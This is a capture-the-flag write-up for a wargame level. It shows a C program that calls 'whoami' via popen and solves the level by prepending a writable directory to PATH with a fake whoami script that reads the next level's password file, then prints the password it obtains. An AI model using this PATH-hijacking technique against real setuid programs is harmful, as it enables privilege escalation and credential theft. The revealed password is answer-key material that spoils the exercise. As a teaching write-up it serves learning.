## Level 4:

The code for the program is simple:

```c
  1 //writen by bla
  2 #include <stdlib.h>
  3 #include <stdio.h>
  4 
  5 int main() {
  6         char username[1024];
  7         FILE* f = popen("whoami","r");
  8         fgets(username, sizeof(username), f);
  9         printf("Welcome %s", username);
 10 
 11         return 0;
 12 }
 13
```

We can see it opening a process and calling a command **whoami**. This is normally safe but we can change what **whoami** stands for by changing the path it looks for the command. We can create a file in /tmp directory.

```console
level4@io:/tmp$ mkdir A
level4@io:/tmp$ cd A
level4@io:/tmp/A$ export PATH=/tmp/A:$PATH
level4@io:/tmp/A$ vim whoami
```

First I created a directory (optional), added the directory to the **PATH** and created a whoami file containing the script I want to be run as **level5** :

```shellscript
<!-- whoami -->
1 #!/bin/sh
2 
3 cat /home/level5/.pass
```

After saving it, just execute the level04 program.

```console
level4@io:/tmp/A$ chmod ou+x whoami
level4@io:/tmp/A$ ../../levels/level04
Welcome DNLM3Vu0mZfX0pDd
level4@io:/tmp/A$ 
```


<!-- Level 4 password => DNLM3Vu0mZfX0pDd -->